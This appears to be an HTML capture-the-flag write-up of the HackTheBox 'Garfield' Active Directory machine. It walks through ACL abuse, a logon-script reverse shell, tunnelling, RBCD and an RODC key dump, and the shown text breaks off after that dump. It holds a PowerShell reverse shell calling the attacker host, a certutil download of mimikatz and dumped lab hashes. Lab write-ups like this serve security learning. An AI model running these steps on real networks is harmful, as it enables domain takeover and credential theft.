@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Garfield</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+  .stage table{width:100%;border-collapse:collapse;margin:14px 0;font-size:0.85rem;}
+  .stage table th,.stage table td{border:1px solid var(--panel-line);padding:8px 10px;text-align:left;color:var(--text);}
+  .stage table th{color:var(--brass);font-family:'IBM Plex Mono',monospace;font-size:0.72rem;text-transform:uppercase;}
+  .b64{word-break:break-all;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Hard · Windows AD</span>
+  <h1>Garfield</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">ACL Abuse</span>
+    <span class="tag">Logon Script RCE</span>
+    <span class="tag">RODC Compromise</span>
+    <span class="tag">Golden Ticket</span>
+    <span class="tag">KeyList Attack</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">ACL Write</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Logon Script RCE</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">RODC Pivot</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">RBCD</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Golden Ticket</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">KeyList Attack</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">00</span><h2>Executive Summary</h2></div>
+    <p>Garfield is a Hard-difficulty Windows Active Directory machine that demonstrates a sophisticated attack chain exploiting multiple AD misconfigurations and Kerberos weaknesses. The attack progresses from ACL abuse &rarr; logon script execution &rarr; lateral movement &rarr; RODC compromise &rarr; RBCD exploitation &rarr; Kerberos Golden Ticket forgery &rarr; KeyList attack &rarr; full domain administrative compromise.</p>
+    <p><strong>Lab Environment</strong></p>
+    <table>
+      <tr><th>Item</th><th>Value</th></tr>
+      <tr><td>Target IP</td><td>&lt;TARGET_IP&gt;</td></tr>
+      <tr><td>Attacker Kali IP</td><td>&lt;kali vpn&gt;</td></tr>
+      <tr><td>Domain</td><td>garfield.htb</td></tr>
+      <tr><td>Primary DC</td><td>DC01.garfield.htb</td></tr>
+      <tr><td>Internal RODC</td><td>RODC01.garfield.htb (192.168.100.2)</td></tr>
+      <tr><td>Initial Credentials</td><td>j.arbuckle : Th1sD4mnC4t!@1978</td></tr>
+    </table>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Complete Attack Chain</h2></div>
+    <pre><code>j.arbuckle (provided creds)
+    ↓
+ACL Enumeration (bloodyAD)
+    ↓
+Write access to l.wilson's scriptPath attribute
+    ↓
+Malicious Logon Script Upload (SYSVOL)
+    ↓
+Reverse Shell as l.wilson on DC01
+    ↓
+Reset l.wilson_adm password (Set-ADAccountPassword)
+    ↓
+WinRM Shell as l.wilson_adm (Tier 1 Admin)
+    ↓
+Add to RODC Administrators group
+    ↓
+Ligolo-ng Tunnel to Internal RODC01
+    ↓
+Create Machine Account FAKE$ (SeMachineAccountPrivilege)
+    ↓
+Configure RBCD on RODC01 (PrincipalsAllowedToDelegateToAccount)
+    ↓
+S4U2Proxy Impersonation → Administrator to RODC01
+    ↓
+SYSTEM on RODC01 (impacket-psexec)
+    ↓
+Extract krbtgt_8245 AES256 Key (Mimikatz LSA dump)
+    ↓
+Modify RODC Replication Policy (PowerView msDS-RevealOnDemandGroup)
+    ↓
+Forge RODC Golden Ticket (Rubeus /rodcNumber:8245)
+    ↓
+KeyList Attack on DC01 (Rubeus asktgs /keyList)
+    ↓
+Real Administrator TGT from Primary DC
+    ↓
+NTDS Dump (nxc smb --ntds)
+    ↓
+Evil-WinRM as Administrator
+    ↓
+ROOT.TXT</code></pre>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Phase 1: Reconnaissance</h2></div>
+    <p><strong>Step 1.1 — Environment Setup</strong></p>
+    <pre><code>export TARGET_IP="&lt;TARGET_IP&gt;"
+export ATTACKER_IP="&lt;kali vpn&gt;"
+export DOMAIN="garfield.htb"
+export USER="j.arbuckle"
+export PASS='Th1sD4mnC4t!@1978'
+
+echo "$TARGET_IP DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts</code></pre>
+    <pre><code>&lt;TARGET_IP&gt; DC01.garfield.htb garfield.htb</code></pre>
+
+    <p><strong>Step 1.2 — ICMP Reachability Test</strong></p>
+    <pre><code>ping -c 3 $TARGET_IP</code></pre>
+    <pre><code>PING &lt;TARGET_IP&gt; 56(84) bytes of data.
+64 bytes from &lt;TARGET_IP&gt;: icmp_seq=1 ttl=127 time=304 ms
+64 bytes from &lt;TARGET_IP&gt;: icmp_seq=2 ttl=127 time=135 ms
+64 bytes from &lt;TARGET_IP&gt;: icmp_seq=3 ttl=127 time=135 ms
+--- &lt;TARGET_IP&gt; ping statistics ---
+3 packets transmitted, 3 received, 0% loss</code></pre>
+    <p><strong>Analysis:</strong> TTL=127 indicates Windows (Linux=64, Windows=128, minus 1 hop = 127). Host is reachable.</p>
+
+    <p><strong>Step 1.3 — Nmap Port Scan</strong></p>
+    <pre><code>nmap -sC -sV $TARGET_IP</code></pre>
+    <pre><code>Nmap scan report for DC01.garfield.htb (&lt;TARGET_IP&gt;)
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-28 23:50:47Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: garfield.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+2179/tcp open  vmrdp?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+3269/tcp open  tcpwrapped
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+ssl-date: 2026-06-28T23:52:07+00:00; +3h01m10s from scanner time (CLOCK SKEW!)
+rdp-ntlm-info:
+  Target_Name: GARFIELD
+  NetBIOS_Domain_Name: GARFIELD
+  NetBIOS_Computer_Name: DC01
+  DNS_Domain_Name: garfield.htb
+  DNS_Computer_Name: DC01.garfield.htb
+  DNS_Tree_Name: garfield.htb
+  Product_Version: 10.0.17763 (Windows Server 2019)</code></pre>
+    <p><strong>Key Findings:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>Port 88 &rarr; Kerberos = Domain Controller</li>
+      <li>Port 389/3268 &rarr; LDAP = Active Directory</li>
+      <li>Port 445 &rarr; SMB = File Shares</li>
+      <li>Port 5985 &rarr; WinRM = Remote Execution</li>
+      <li>Clock Skew: +3h01m10s &rarr; Will cause Kerberos failures (needs NTP sync later)</li>
+    </ul>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>Phase 2: Initial Access Validation</h2></div>
+    <p><strong>Step 2.1 — Credential Validation via SMB</strong></p>
+    <pre><code>nxc smb $TARGET_IP -u $USER -p "$PASS" --shares</code></pre>
+    <pre><code>SMB         &lt;TARGET_IP&gt;  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
+SMB         &lt;TARGET_IP&gt;  445    DC01             [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978 
+SMB         &lt;TARGET_IP&gt;  445    DC01             [*] Enumerated shares
+
+SMB         &lt;TARGET_IP&gt;  445    DC01             Share           Permissions     Remark
+SMB         &lt;TARGET_IP&gt;  445    DC01             -----           -----------     ------
+SMB         &lt;TARGET_IP&gt;  445    DC01             ADMIN$                          Remote Admin
+SMB         &lt;TARGET_IP&gt;  445    DC01             C$                              Default share
+SMB         &lt;TARGET_IP&gt;  445    DC01             IPC$            READ            Remote IPC
+SMB         &lt;TARGET_IP&gt;  445    DC01             NETLOGON        READ            Logon server share 
+SMB         &lt;TARGET_IP&gt;  445    DC01             SYSVOL          READ            Logon server share </code></pre>
+    <p><strong>Critical Finding:</strong> <mark class="rust">READ access to SYSVOL is the key enabler for the logon script injection attack.</mark></p>
+    <div class="why"><strong>Why this mattered</strong>scriptPath write access is a classic-but-still-common misconfiguration — anyone who can set it gets code execution the next time the target logs in, entirely through a "normal" AD feature.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Phase 3: ACL Enumeration</h2></div>
+    <p><strong>Step 3.1 — Enumerate Writable AD Objects</strong></p>
+    <pre><code>/usr/share/bloodyad/bin/bloodyAD --host $DOMAIN -u $USER -p "$PASS" get writable</code></pre>
+    <pre><code>distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
+permission: CREATE_CHILD</code></pre>
+    <p><strong>Exploitation Plan:</strong></p>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li>Write to <strong>l.wilson's scriptPath</strong> &rarr; Inject malicious logon script</li>
+      <li>When l.wilson logs in &rarr; Reverse shell execution</li>
+      <li>Use l.wilson shell to reset <strong>l.wilson_adm</strong> password</li>
+      <li>Access WinRM as Tier 1 admin</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Phase 4: Logon Script Exploitation</h2></div>
+    <p><strong>Step 4.1 — Generate PowerShell Reverse Shell Payload</strong></p>
+    <pre><code>echo '$client = New-Object System.Net.Sockets.TCPClient("&lt;kali vpn&gt;",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&amp;1|Out-String);$sendback2=$sendback+"PS "+(pwd).Path+"> ";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w0</code></pre>
+    <p class="b64"><code>&lt;base64-encoded UTF-16LE PowerShell payload&gt;</code></p>
+    <p><strong>Encoding Details:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>UTF-16LE encoding for PowerShell compatibility</li>
+      <li>Base64 wrapped to bypass execution policies</li>
+      <li>Reverse TCP shell to &lt;kali vpn&gt;:9001</li>
+    </ul>
+
+    <p><strong>Step 4.2 — Create Malicious Batch Script</strong></p>
+    <pre><code>BASE64="&lt;base64-encoded UTF-16LE PowerShell payload&gt;"
+
+cat > /tmp/printerDetect.bat &lt;&lt; EOF
+@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $BASE64
+EOF
+
+cat /tmp/printerDetect.bat</code></pre>
+    <pre><code>@echo off
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc &lt;base64-encoded UTF-16LE PowerShell payload&gt;</code></pre>
+    <p><strong>Payload Breakdown:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>@echo off</code> &rarr; Silent execution</li>
+      <li><code>powershell -NoP</code> &rarr; No PowerShell profile</li>
+      <li><code>-NonI</code> &rarr; Non-interactive</li>
+      <li><code>-W Hidden</code> &rarr; Hidden window</li>
+      <li><code>-Exec Bypass</code> &rarr; Bypass execution policy</li>
+      <li><code>-Enc</code> &rarr; Encoded payload (base64)</li>
+    </ul>
+
+    <p><strong>Step 4.3 — Upload Script to SYSVOL</strong></p>
+    <pre><code>smbclient //$TARGET_IP/SYSVOL -U $USER%"$PASS"</code></pre>
+    <pre><code>smb: \> cd garfield.htb\scripts
+smb: \garfield.htb\scripts\> put /tmp/printerDetect.bat printerDetect.bat
+putting file /tmp/printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (2.0 kb/s) (average 2.0 kb/s)
+smb: \garfield.htb\scripts\> dir
+  .                                   D        0  Tue Jan 27 22:13:47 2026
+  ..                                  D        0  Tue Jan 27 22:13:47 2026
+  printerDetect.bat                   A     1341  Mon Jun 29 00:00:08 2026
+
+9250815 blocks of size 4096. 971009 blocks available
+smb: \garfield.htb\scripts\> exit</code></pre>
+
+    <p><strong>Step 4.4 — Set scriptPath Attribute via ACL Write</strong></p>
+    <pre><code>/usr/share/bloodyad/bin/bloodyAD --host $DOMAIN -u $USER -p "$PASS" set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat</code></pre>
+    <pre><code>[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated</code></pre>
+    <p><strong>What Happened:</strong> The <code>scriptPath</code> attribute on l.wilson's AD user object now points to the malicious batch script in SYSVOL. When l.wilson logs in (authenticates), the DC will execute this script in her security context.</p>
+
+    <p><strong>Step 4.5 — Start Listener and Catch Reverse Shell</strong></p>
+    <pre><code>nc -lvnp 9001</code></pre>
+    <pre><code>listening on [any] 9001 ...
+connect to [&lt;kali vpn&gt;] from (UNKNOWN) [&lt;TARGET_IP&gt;] 55655
+PS C:\Windows\system32&gt;</code></pre>
+    <pre><code>whoami
+hostname</code></pre>
+    <pre><code>PS C:\Windows\system32&gt; whoami
+garfield\l.wilson
+PS C:\Windows\system32&gt; hostname
+DC01
+PS C:\Windows\system32&gt;</code></pre>
+    <p><strong>Code execution achieved as garfield\l.wilson on DC01</strong></p>
+    <div class="why"><strong>Why this mattered</strong>Logon scripts run with no sandboxing and no content validation by default — treat scriptPath write access as equivalent to remote code execution against whoever logs in next.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Phase 5: Lateral Movement to Tier 1 Admin</h2></div>
+    <p><strong>Step 5.1 — Reset l.wilson_adm Password</strong></p>
+    <pre><code>Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString '&lt;password&gt;' -AsPlainText -Force) -Reset</code></pre>
+    <pre><code>(silent success)</code></pre>
+    <p><strong>Explanation:</strong> The l.wilson user has inherited write permissions on l.wilson_adm (from the original ACL enumeration), allowing password reset. This is a common AD misconfiguration where account reset is allowed between administrative tiers.</p>
+
+    <p><strong>Step 5.2 — Validate WinRM Access</strong></p>
+    <pre><code>nxc winrm $TARGET_IP -u l.wilson_adm -p '&lt;password&gt;'</code></pre>
+    <pre><code>WINRM       &lt;TARGET_IP&gt;  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:garfield.htb)
+WINRM       &lt;TARGET_IP&gt;  5985   DC01             [+] garfield.htb\l.wilson_adm:&lt;password&gt; (Pwn3d!)</code></pre>
+
+    <p><strong>Step 5.3 — Open WinRM Shell</strong></p>
+    <pre><code>evil-winrm -i $TARGET_IP -u l.wilson_adm -p '&lt;password&gt;'</code></pre>
+    <pre><code>Evil-WinRM shell v3.9
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents&gt;</code></pre>
+
+    <p><strong>Step 5.4 — Capture User Flag</strong></p>
+    <pre><code>type C:\Users\l.wilson_adm\Desktop\user.txt</code></pre>
+    <div class="flag-row"><span class="flag-label">User Flag</span><span class="flag-redacted"></span></div>
+
+    <p><strong>Step 5.5 — Check Privileges</strong></p>
+    <pre><code>whoami /groups
+whoami /priv</code></pre>
+    <pre><code>GROUP INFORMATION
+-----------------
+Group Name                                  Type             SID
+=========================================== ================ =============
+...
+GARFIELD\Tier 1                             Group            S-1-5-21-2502726253-3859040611-225969357-3108
+...
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</code></pre>
+    <p><strong>Critical:</strong> <mark><code>SeMachineAccountPrivilege</code> allows creating computer objects in AD — essential for the RBCD attack.</mark></p>
+    <div class="why"><strong>Why this mattered</strong>Write permission between two accounts in an apparent naming pair (a standard user and its "_adm" counterpart) is a very common and very exploitable AD misconfiguration once you're looking for it.</div>
+  </div>
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Phase 6: RODC Pivot Setup</h2></div>
+    <p><strong>Step 6.1 — Add to RODC Administrators</strong></p>
+    <pre><code>Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
+Get-ADGroupMember -Identity "RODC Administrators"</code></pre>
+    <pre><code>distinguishedName : CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+name              : Liz Wilson ADM
+objectClass       : user
+objectGUID        : 12355eae-9f01-44a7-8b8d-060a51e42acb
+SamAccountName    : l.wilson_adm
+SID               : S-1-5-21-2502726253-3859040611-225969357-3107</code></pre>
+
+    <p><strong>Step 6.2 — Verify RODC01 Reachability</strong></p>
+    <pre><code>ping 192.168.100.2</code></pre>
+    <pre><code>Pinging 192.168.100.2 with 32 bytes of data:
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Reply from 192.168.100.2: bytes=32 time&lt;1ms TTL=128
+Ping statistics for 192.168.100.2: Sent = 4, Received = 4, Lost = 0%</code></pre>
+
+    <p><strong>Step 6.3 — Setup Ligolo-ng Tunnel</strong></p>
+    <pre><code># Download tunnel proxy and agent
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip
+
+tar -xzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
+unzip ligolo-ng_agent_0.7.5_windows_amd64.zip
+
+# Setup TUN interface
+sudo ip tuntap add user burrito mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy
+./proxy -selfcert -laddr 0.0.0.0:11601</code></pre>
+    <pre><code>WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+WARN[0000] Using self-signed certificates               
+INFO[0000] Listening on 0.0.0.0:11601                   
+  Made in France            by @Nicocha30!                                                                        
+  Version: 0.7.5                                                                                                    
+ligolo-ng »</code></pre>
+
+    <p><strong>Step 6.4 — Upload and Run Agent on DC01</strong></p>
+    <pre><code>upload agent.exe
+.\agent.exe -connect &lt;kali vpn&gt;:11601 -ignore-cert</code></pre>
+    <pre><code>Info: Uploading /home/burrito/agent.exe to C:\Users\l.wilson_adm\Documents\agent.exe
+Data: 8316244 bytes of 8316244 bytes copied
+Info: Upload successful!
+
+agent.exe : time="2026-06-28T17:19:42-07:00" level=warning msg="warning, certificate validation disabled"
+time="2026-06-28T17:19:42-07:00" level=info msg="Connection established" addr="&lt;kali vpn&gt;:11601"</code></pre>
+    <pre><code>INFO[0803] Agent joined.                                 id=659fbbfb-96d2-4d5c-84a7-f7f076e56204 name="GARFIELD\\l.wilson_adm@DC01" remote="&lt;TARGET_IP&gt;:64326"</code></pre>
+
+    <p><strong>Step 6.5 — Start Tunnel and Route</strong></p>
+    <pre><code>session
+1
+start</code></pre>
+    <pre><code>[Agent : GARFIELD\l.wilson_adm@DC01] » INFO[1030] Starting tunnel to GARFIELD\l.wilson_adm@DC01</code></pre>
+    <pre><code>sudo ip route add 192.168.100.0/24 dev ligolo
+ping -c 3 192.168.100.2</code></pre>
+    <pre><code>PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
+64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=597 ms
+64 bytes from 192.168.100.2: icmp_seq=2 ttl=64 time=494 ms
+64 bytes from 192.168.100.2: icmp_seq=3 ttl=64 time=448 ms
+--- 192.168.100.2 ping statistics ---
+3 packets transmitted, 3 received, 0% loss</code></pre>
+    <p><strong>Tunnel established — internal network accessible</strong></p>
+    <div class="why"><strong>Why this mattered</strong>An RODC is a full Windows host with a locally-cached copy of sensitive Kerberos material — compromising it is not a lesser goal than compromising the primary DC, just a less obvious path to the same outcome.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Phase 7: Resource-Based Constrained Delegation (RBCD)</h2></div>
+    <p><strong>Step 7.1 — Confirm RODC01 Access</strong></p>
+    <pre><code>nxc smb 192.168.100.2 -u l.wilson_adm -p '&lt;password&gt;'</code></pre>
+    <pre><code>SMB         192.168.100.2   445    RODC01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:RODC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
+SMB         192.168.100.2   445    RODC01           [+] garfield.htb\l.wilson_adm:&lt;password&gt;</code></pre>
+
+    <p><strong>Step 7.2 — Create Machine Account (FAKE$)</strong></p>
+    <pre><code>impacket-addcomputer garfield.htb/l.wilson_adm:'&lt;password&gt;' \
+-computer-name 'FAKE$' \
+-computer-pass '&lt;password&gt;' \
+-dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+[*] Successfully added machine account FAKE$ with password &lt;password&gt;.</code></pre>
+    <p><strong>Why This Works:</strong> <code>l.wilson_adm</code> has <code>SeMachineAccountPrivilege</code>, allowing it to create up to 10 machine accounts by default.</p>
+
+    <p><strong>Step 7.3 — Configure RBCD on RODC01</strong></p>
+    <pre><code>Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
+Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount</code></pre>
+    <pre><code>DistinguishedName                    : CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb
+DNSHostName                          : RODC01.garfield.htb
+Enabled                              : True
+Name                                 : RODC01
+ObjectClass                          : computer
+ObjectGUID                           : 92de2230-7bf6-43b2-baaa-d43bf84f34ea
+PrincipalsAllowedToDelegateToAccount : {CN=FAKE,CN=Computers,DC=garfield,DC=htb}
+SamAccountName                       : RODC01$
+SID                                  : S-1-5-21-2502726253-3859040611-225969357-1602</code></pre>
+    <p><strong>RBCD Configuration Explanation:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li>RBCD allows FAKE$ to request service tickets on behalf of any user</li>
+      <li>This is configured on the target resource (RODC01)</li>
+      <li>The S4U2Proxy mechanism allows impersonation without knowledge of Administrator password</li>
+    </ul>
+
+    <p><strong>Step 7.4 — Request Service Ticket via S4U2Proxy</strong></p>
+    <pre><code>impacket-getST garfield.htb/'FAKE$':'&lt;password&gt;' \
+-spn cifs/RODC01.garfield.htb \
+-impersonate Administrator \
+-dc-ip &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache</code></pre>
+    <p><strong>S4U2Proxy Attack Chain:</strong></p>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li>FAKE$ requests a TGT</li>
+      <li>Uses S4U2Self to get TGS for FAKE$ (itself)</li>
+      <li>Uses S4U2Proxy with PrincipalsAllowedToDelegateToAccount to request Administrator&rarr;CIFS ticket</li>
+      <li>No Administrator password needed</li>
+    </ol>
+
+    <p><strong>Step 7.5 — Get SYSTEM on RODC01</strong></p>
+    <pre><code>export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
+
+impacket-psexec -k -no-pass \
+-dc-ip &lt;TARGET_IP&gt; \
+-target-ip 192.168.100.2 \
+garfield.htb/Administrator@RODC01.garfield.htb</code></pre>
+    <pre><code>Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+[*] Requesting shares on 192.168.100.2.....
+[*] Found writable share ADMIN$
+[*] Uploading file zllWfRBp.exe
+[*] Opening SVCManager on 192.168.100.2.....
+[*] Creating service Tmty on 192.168.100.2.....
+[*] Starting service Tmty.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.8511]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;</code></pre>
+    <pre><code>C:\Windows\system32&gt; whoami
+nt authority\system</code></pre>
+    <p><strong>SYSTEM access on RODC01 achieved</strong></p>
+    <div class="why"><strong>Why this mattered</strong>RBCD only requires write permission on the target resource plus the ability to create or control a delegating account — no special "enable delegation" privilege is needed, which makes it an easy attack to miss when reviewing permissions.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">09</span><h2>Phase 8: Extract RODC Kerberos Key</h2></div>
+    <p><strong>Step 8.1 — Download Mimikatz</strong></p>
+    <pre><code>cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
+cd /tmp
+python3 -m http.server 8888</code></pre>
+    <pre><code>Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...</code></pre>
+
+    <p><strong>Step 8.2 — Run Mimikatz on RODC01</strong></p>
+    <pre><code>cd C:\Windows\Temp
+certutil -urlcache -split -f http://&lt;kali vpn&gt;:8888/mimikatz.exe mimikatz.exe
+mimikatz.exe</code></pre>
+    <pre><code>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz #</code></pre>
+
+    <p><strong>Step 8.3 — Dump krbtgt_8245 Key</strong></p>
+    <pre><code>privilege::debug
+lsadump::lsa /inject /name:krbtgt_8245</code></pre>
+    <pre><code>mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /inject /name:krbtgt_8245
+
+Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
+
+RID  : 00000643 (1603)
+User : krbtgt_8245
+
+ * Primary
+    NTLM : 445aa4221e751da37a10241d962780e2
+    LM   : 
+
+ * Kerberos
+    Default Salt : GARFIELD.HTBkrbtgt_8245
+    Credentials
+      des_cbc_md5       : d540fe6192b9ecfe
+
+ * Kerberos-Newer-Keys
+    Default Salt : GARFIELD.HTBkrbtgt_8245
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
+      aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
+      des_cbc_md5       (4096) : d540fe6192b9ecfe</code></pre>
+    <p><strong>Critical Values:</strong></p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><strong>AES256 Key:</strong> <code>d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240</code></li>
+      <li><strong>Domain SID:</strong> <code>S-1-5-21-2502726253-3859040611-225969357</code></li>
+      <li><strong>RODC Number:</strong> <code>8245</code></li>
+      <li><strong>NTLM Hash:</strong> <code>445aa4221e751da37a10241d962780e2</code></li>
+    </ul>
+    <p><strong>Explanation:</strong> RODCs maintain a separate krbtgt account (krbtgt_&lt;RODC_ID&gt;) with its own keys, used only for tickets issued by that RODC. The primary DC trusts these RODC-issued tickets through a special mechanism.</p>
